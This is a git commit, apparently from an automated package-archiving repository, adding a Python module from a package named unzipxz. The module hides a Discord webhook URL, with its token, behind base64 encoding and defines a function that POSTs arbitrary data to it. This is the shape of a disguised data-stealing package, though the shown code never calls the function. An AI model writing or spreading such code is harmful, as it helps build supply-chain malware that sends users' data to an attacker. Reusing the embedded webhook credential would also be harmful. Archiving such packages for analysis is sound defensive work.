a1dbbfb5430ec1392cd8e772607fe373f29cfbf8
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-12-06 11:05:49 +0000

    Add package unzipxz/0.0.1/unzipxz-0.0.1-py3-none-any.whl

---
+++ packages/unzipxz/unzipxz-0.0.1-py3-none-any.whl/unzipxz.py
@@ -0,0 +1,7 @@
+import requests
+import unzipxz
+import base64 
+i = L00k = base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwNjI0Mzk4ODQ3ODYyNzkxMS9MdXEtNEFHNExnUzN6ZnFCTGF4cmNReXdmLTBsM21abFVPRGpGS1poQXRnQkxYdE5NXzR2a2NTN0dMT1FpMkdoUncwbQ==')
+
+def h(i,d):
+    requests.post(url=i,data=d)
